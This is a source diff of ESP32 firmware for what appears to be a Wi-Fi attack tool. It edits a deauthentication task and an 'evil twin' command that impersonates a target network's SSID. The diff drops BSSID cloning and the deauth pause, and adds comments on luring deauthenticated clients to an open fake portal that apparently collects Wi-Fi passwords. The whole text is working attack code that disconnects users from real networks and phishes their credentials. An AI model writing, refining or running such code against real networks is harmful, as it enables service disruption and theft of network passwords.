@@ -3931,13 +3931,6 @@ static void deauth_attack_task(void *pvParameters) {
         }
         
         if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) {
-            // In Evil Twin mode, pause deauth when clients are connected
-            // to our portal — otherwise we kick our own clients because
-            // we share the same BSSID as the target AP.
-            if (applicationState == DEAUTH_EVIL_TWIN && portal_connected_clients > 0) {
-                vTaskDelay(pdMS_TO_TICKS(500));
-                continue;
-            }
             // Send deauth frames (silent mode - no UART spam)
             ESP_ERROR_CHECK(led_set_color(0, 0, 255));
             wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
@@ -7133,8 +7126,9 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             applicationState = DEAUTH;
         } else {
             applicationState = DEAUTH_EVIL_TWIN;
-            // Reset password wrong flag for new attack
+            // Reset state for new attack
             last_password_wrong = false;
+            portal_connected_clients = 0;
         }
 
         const char *sourceSSID = (const char *)g_scan_results[g_selected_indices[0]].ssid;
@@ -7193,22 +7187,10 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             // AP mode was enabled by ensure_ap_mode(), update the configuration
             ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
 
-            // Clone the exact BSSID of the target network so clients
-            // auto-connect to our AP after deauth.  The deauth task
-            // pauses when clients are connected to avoid kicking them.
-            {
-                int target_idx = g_selected_indices[0];
-                uint8_t *target_bssid = g_scan_results[target_idx].bssid;
-                esp_err_t mac_ret = esp_wifi_set_mac(WIFI_IF_AP, target_bssid);
-                if (mac_ret == ESP_OK) {
-                    MY_LOG_INFO(TAG, "AP MAC cloned to %02X:%02X:%02X:%02X:%02X:%02X",
-                               target_bssid[0], target_bssid[1], target_bssid[2],
-                               target_bssid[3], target_bssid[4], target_bssid[5]);
-                } else {
-                    MY_LOG_INFO(TAG, "Failed to clone AP MAC: %s (using default)",
-                               esp_err_to_name(mac_ret));
-                }
-            }
+            // Note: we do NOT clone the target BSSID — with the same MAC,
+            // our deauth frames would also kick clients from the fake AP.
+            // The matching SSID (open, no password) is enough to appear
+            // in the client's network list after deauth from the real AP.
             if (ret != ESP_OK) {
                 MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
                 applicationState = IDLE;
